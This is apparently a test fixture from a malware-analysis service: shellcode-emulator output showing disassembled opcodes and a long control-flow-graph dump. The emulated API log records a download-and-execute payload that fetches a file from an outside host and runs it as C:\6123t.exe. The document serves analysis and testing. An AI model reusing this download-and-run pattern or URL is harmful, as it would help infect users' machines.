@@ -1,0 +1,181 @@
+graph file /home/arturg/Projekty/hsn2/repo/hsn2/trunk/software/Services/hsn2-sc-service/testTmp/tmp3030838681248511757.d/scdbg-2979502617628742718-graphFile
+Loaded 35e bytes from file /home/arturg/Projekty/hsn2/repo/hsn2/trunk/software/Services/hsn2-sc-service/testTmp/file-with-urls
+Memory monitor enabled..
+Memory monitor for dlls enabled..
+Initilization Complete..
+Execution starts at file offset 3b Opcodes: 05 05 90 90 90 60 50 33 c9 64 
+40103b	0505909090                      add eax,0x90909005
+401040	60                              pusha 
+401041	50                              push eax
+401042	33C9                            xor ecx,ecx
+401044	64034930                        add ecx,fs:[ecx+0x30]
+
+Dump mode Active...
+Max Steps: 2000000
+Using base offset: 0x401000
+
+4010b3	LoadLibraryA(urlmon.dll)
+dd	URLDownloadToFile(http://user1.12-26.net/bak.css, C:\6123t.exe)
+f1	WinExec(C:\6123t.exe)
+301ad655	 error accessing 0x301ad655 not mapped
+
+Stepcount 228951
+Primary memory: Reading 0x35e bytes from 0x401000
+Scanning for changes...
+No changes found in primary memory, dump not created.
+
+Memory Monitor Log:
+	*PEB (fs30) accessed at 0x401044
+	peb.InInitializationOrderModuleList accessed at 0x40104b
+copying vertexes
+optimizing graph
+vertex 0xa5d8ca0
+going forwards from 0xa5d8ca0
+ -> vertex 0xa7ffc38
+ -> vertex 0xa7ffdc8
+ -> vertex 0xa7ffec8
+ -> vertex 0xa800038
+ -> vertex 0xa8001c0
+ -> vertex 0xa800318
+ -> vertex 0xa800470
+ -> vertex 0xa8005c8
+ -> vertex 0xa800720
+ -> vertex 0xa800820
+ -> vertex 0xa800950
+ -> vertex 0xa800ad8
+copying edges for 0xa800ad8
+ -> 0xa808418
+vertex 0xa800bd8
+going forwards from 0xa800bd8
+copying edges for 0xa800bd8
+ -> 0xa808520
+vertex 0xa800d60
+going forwards from 0xa800d60
+ -> vertex 0xa800eb8
+ -> vertex 0xa800fb8
+ -> vertex 0xa8010e8
+ -> vertex 0xa801270
+ -> vertex 0xa801370
+ -> vertex 0xa8014a0
+copying edges for 0xa8014a0
+ -> 0xa808c30
+vertex 0xa8015d0
+going forwards from 0xa8015d0
+copying edges for 0xa8015d0
+ -> 0xa808d30
+vertex 0xa801700
+going forwards from 0xa801700
+ -> vertex 0xa801888
+copying edges for 0xa801888
+ -> 0xa808f28
+vertex 0xa801988
+going forwards from 0xa801988
+copying edges for 0xa801988
+ -> 0xa809038
+vertex 0xa801a90
+going forwards from 0xa801a90
+copying edges for 0xa801a90
+ -> 0xa809138
+vertex 0xa801bf8
+going forwards from 0xa801bf8
+copying edges for 0xa801bf8
+ -> 0xa809238
+ -> 0xa809638
+vertex 0xa801d28
+going forwards from 0xa801d28
+ -> vertex 0xa801e58
+ -> vertex 0xa801f88
+ -> vertex 0xa8020b8
+copying edges for 0xa8020b8
+ -> 0xa808f28
+vertex 0xa8021e8
+going forwards from 0xa8021e8
+copying edges for 0xa8021e8
+ -> 0xa809738
+vertex 0xa802348
+going forwards from 0xa802348
+copying edges for 0xa802348
+ -> 0xa808c30
+ -> 0xa809838
+vertex 0xa802478
+going forwards from 0xa802478
+ -> vertex 0xa8025d8
+ -> vertex 0xa802760
+ -> vertex 0xa802860
+ -> vertex 0xa8029e8
+ -> vertex 0xa802b40
+ -> vertex 0xa802c40
+ -> vertex 0xa802dc8
+copying edges for 0xa802dc8
+ -> 0xa80a058
+vertex 0xa802ec8
+going forwards from 0xa802ec8
+copying edges for 0xa802ec8
+ -> 0xa80a150
+ -> 0xa80a940
+ -> 0xa80b740
+ -> 0xa80bd30
+vertex 0xa803050
+going forwards from 0xa803050
+ -> vertex 0xa803150
+ -> vertex 0xa8032d8
+copying edges for 0xa8032d8
+ -> 0xa80a458
+vertex 0xa8033d8
+going forwards from 0xa8033d8
+copying edges for 0xa8033d8
+ -> 0xa80a538
+vertex 0xa803508
+going forwards from 0xa803508
+ -> vertex 0xa8035f8
+ -> vertex 0xa803728
+ -> vertex 0xa8038b0
+copying edges for 0xa8038b0
+ -> 0xa808418
+vertex 0xa8039b0
+going forwards from 0xa8039b0
+ -> vertex 0xa803b68
+ -> vertex 0xa803cc0
+ -> vertex 0xa803dc0
+ -> vertex 0xa803ef0
+ -> vertex 0xa804020
+ -> vertex 0xa804150
+ -> vertex 0xa804280
+ -> vertex 0xa8043b0
+ -> vertex 0xa8044e0
+copying edges for 0xa8044e0
+ -> 0xa80b350
+vertex 0xa804610
+going forwards from 0xa804610
+copying edges for 0xa804610
+ -> 0xa80b438
+vertex 0xa8046e8
+going forwards from 0xa8046e8
+ -> vertex 0xa804858
+ -> vertex 0xa8049e0
+copying edges for 0xa8049e0
+ -> 0xa808418
+vertex 0xa804ae0
+going forwards from 0xa804ae0
+ -> vertex 0xa804c40
+ -> vertex 0xa804dc8
+copying edges for 0xa804dc8
+ -> 0xa80ba48
+vertex 0xa804ec8
+going forwards from 0xa804ec8
+copying edges for 0xa804ec8
+ -> 0xa80bb28
+vertex 0xa804fe8
+going forwards from 0xa804fe8
+ -> vertex 0xa805140
+copying edges for 0xa805140
+ -> 0xa808418
+vertex 0xa805240
+going forwards from 0xa805240
+ -> vertex 0xa8053f8
+ -> vertex 0xa805550
+ -> vertex 0xa805650
+copying edges for 0xa805650
+vertex 0xa805780
+going forwards from 0xa805780
+copying edges for 0xa805780
